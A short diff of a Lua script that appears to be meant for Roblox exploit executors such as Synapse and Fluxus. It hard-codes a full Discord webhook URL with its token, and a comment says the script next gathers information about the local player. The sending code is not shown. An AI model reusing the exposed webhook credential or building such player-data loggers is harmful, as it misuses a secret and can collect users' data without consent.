@@ -1,7 +1,4 @@
-local HttpService = game:GetService("HttpService")
-local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
-
--- URL webhook Discord yang diberikan
+local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) -- Adaptasi buat Fluxus dan executor lain
 local webhookURL = "https://discord.com/api/webhooks/1305029156974755882/j5FWX04txU-dWUXB1oUhg_BuFi2eqqo7AMraQV8ZRtUjwzZ0Bpn1gvzUAgsVfW5dMoCm"
 
 -- Mendapatkan informasi dari pemain lokal yang mengeksekusi skrip
